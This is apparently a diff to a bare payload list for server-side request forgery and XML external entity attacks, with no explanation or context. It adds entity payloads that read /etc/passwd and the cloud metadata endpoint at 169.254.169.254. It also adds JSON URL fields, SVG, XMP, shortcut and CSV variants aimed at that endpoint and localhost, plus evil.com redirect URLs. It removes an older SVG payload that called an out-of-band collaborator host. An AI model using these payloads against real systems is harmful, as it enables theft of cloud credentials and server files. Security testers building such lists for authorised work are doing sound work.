@@ -1,6 +1,34 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://COLLABORATOR/ssrf">]>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <image href="http://169.254.169.254/latest/meta-data/"/>
-  <text>&xxe;</text>
-</svg>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+{"url":"http://169.254.169.254/latest/meta-data/"}
+{"image":"http://169.254.169.254/latest/meta-data/"}
+{"src":"http://169.254.169.254/latest/meta-data/"}
+{"link":"http://169.254.169.254/latest/meta-data/"}
+{"href":"http://169.254.169.254/latest/meta-data/"}
+{"feed":"http://169.254.169.254/latest/meta-data/"}
+{"callback":"http://169.254.169.254/latest/meta-data/"}
+{"webhook":"http://169.254.169.254/latest/meta-data/"}
+{"icon":"http://169.254.169.254/latest/meta-data/"}
+{"logo":"http://169.254.169.254/latest/meta-data/"}
+{"thumbnail":"http://169.254.169.254/latest/meta-data/"}
+{"avatar":"http://169.254.169.254/latest/meta-data/"}
+http://169.254.169.254/latest/meta-data/
+http://localhost/
+http://127.0.0.1/
+http://[::1]/
+<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://localhost/">]><test>&xxe;</test>
+<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><test>&xxe;</test>
+[InternetShortcut]
+URL=http://169.254.169.254/
+[Desktop Entry]
+URL=http://169.254.169.254/
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image href="http://169.254.169.254/latest/meta-data/"></svg>
+<!DOCTYPE svg><svg xmlns="http://www.w3.org/2000/svg"><image href="http://localhost/"/></svg>
+<!DOCTYPE svg><svg xmlns="http://www.w3.org/2000/svg"><use xlink:href="http://169.254.169.254/"/></svg>
+<?xpacket begin="?" id="W5M0MpCehiHzreSzNTczkc9d"?><x:xmpmeta xmlns:x="adobe:ns:meta/" xmlns:xmpDM="http://ns.adobe.com/xmp/1.0/DynamicMedia/" xmlns:stDim="http://ns.adobe.com/xap/1.0/sType/Dimensions#" xmlns:xmp="http://ns.adobe.com/xap/1.0/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description rdf:about="" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/"><xmpMM:DocumentID>ssrf://169.254.169.254/</xmpMM:DocumentID></rdf:Description></rdf:RDF></x:xmpmeta>
+#SSRF via CSV injection
+data:text/csv,url
+http://169.254.169.254/latest/meta-data/
+data:application/xml,<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><test>&xxe;</test>
+http://evil.com/redirect-to-169.254.169.254
+http://evil.com/?r=http://169.254.169.254/
